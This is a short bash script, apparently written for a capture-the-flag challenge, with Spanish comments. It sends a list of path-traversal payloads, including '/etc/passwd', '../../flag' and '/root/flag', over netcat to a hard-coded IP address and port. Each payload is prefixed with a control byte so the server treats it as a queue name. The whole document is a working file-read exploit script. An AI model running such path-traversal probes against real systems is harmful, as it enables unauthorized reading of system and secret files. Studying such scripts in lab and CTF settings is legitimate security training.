#!/bin/bash
TARGET="94.237.49.23"
PORT="37326"

echo "=== Test colas con path traversal ==="

paths=(
    "/etc/passwd"
    "/flag"
    "/flag.txt"
    "../flag"
    "../../flag"
    "../../../flag"
    "/root/flag"
    "/root/flag.txt"
    "/home/flag.txt"
    "flag"
    "flag.txt"
)

for path in "${paths[@]}"; do
    echo "Cola: $path"
    printf "\x04%s\n" "$path" | timeout 5s nc $TARGET $PORT
    echo "---"
done